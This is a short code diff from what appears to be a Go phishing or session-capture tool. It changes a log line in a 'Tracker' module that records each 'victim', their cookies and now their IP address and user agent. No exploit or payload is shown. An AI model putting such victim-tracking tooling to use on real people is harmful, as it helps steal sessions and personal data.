@@ -276,7 +276,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 			Cookies:      sm,
 		}
 		module.Push(v)
-		module.Info("New victim [%s] from (%s %s%s)", tui.Bold(tui.Red(t.ID)), request.Method, request.Host, request.URL)
+		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), request.RemoteAddr, request.UserAgent())
 
 	} else {
 		// This Victim is well known, increasing the number of requests processed
